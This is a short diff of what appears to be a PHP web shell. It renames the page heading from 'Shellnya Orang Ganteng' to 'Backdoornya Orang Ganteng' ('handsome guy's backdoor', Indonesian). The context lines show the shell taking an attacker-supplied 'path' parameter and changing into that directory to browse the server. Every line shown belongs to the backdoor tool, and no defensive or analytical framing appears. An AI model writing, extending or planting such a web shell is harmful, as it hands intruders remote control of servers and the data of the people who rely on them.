@@ -178,7 +178,7 @@ echo "
 <div class='container-fluid'>
 	<div class='py-3' id='main'>
 		<div class='box shadow bg-dark p-4 rounded-3'>
-			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h1>Shellnya Orang Ganteng</h1></a>";
+			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h1>Backdoornya Orang Ganteng</h1></a>";
 			if(isset($_7['path'])){
 				$path = $_7['path'];
 				chdir($path);
